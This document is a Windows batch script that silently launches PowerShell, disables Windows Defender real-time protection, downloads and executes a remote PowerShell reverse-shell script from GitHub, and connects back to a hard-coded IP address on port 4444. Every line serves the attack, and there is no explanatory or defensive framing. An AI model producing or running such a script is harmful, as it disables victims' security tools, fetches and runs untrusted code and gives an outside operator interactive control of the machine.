@echo off
powershell -window hidden -command ""
powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
powershell.exe IEX(IWR https://raw.githubusercontent.com/LorenzoLeonardo/ConPtyShell/master/Invoke-RemoteShell.ps1 -UseBasicParsing); Invoke-RemoteShell -RemoteIp 13.114.25.181 -RemotePort 4444 -Rows 24 -Cols 80
